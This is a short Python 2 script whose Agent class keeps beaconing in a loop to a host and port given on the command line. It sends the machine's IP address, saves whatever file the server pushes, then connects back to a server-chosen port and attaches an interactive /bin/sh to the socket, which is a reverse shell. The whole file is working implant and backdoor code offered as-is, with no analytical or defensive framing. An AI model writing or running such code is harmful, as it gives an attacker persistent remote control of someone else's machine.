import socket, subprocess, errno, time, os, signal, sys


class Agent:
    def __init__(self, target, port):
        self.hostname = target
        self.port = int(port)

    def run_worker(self):
        while True:
            try:
                print "[*] PING"
                self.poke()
            except Exception, exc:
                time.sleep(2)
            else:
                print "[*] PONG"
        else:
            raise

    def poke(self):
        whoami = ([(checkip.connect(('8.8.8.8', 80)), checkip.getsockname()[0], checkip.close()) for checkip in
                   [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.hostname, self.port))
        s.sendall(whoami)
        data = s.recv(1024)
        split = data.split(":")
        if whoami == split[0]:
            f = open('file_' + str(whoami) + ".ep", 'wb')  # open in binary
            while (data):
               f.write(str(data).replace(split[0]+":"+split[1]+":",""))
               data = s.recv(1024)
            f.close()
            print "[*] PONG"
            sterminal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sterminal.connect((self.hostname, int(split[1])))
            os.dup2(sterminal.fileno(), 0)
            os.dup2(sterminal.fileno(), 1)
            os.dup2(sterminal.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
        s.close()

hostname = sys.argv[1]
port = sys.argv[2]
new = Agent(hostname, port)
new.run_worker()
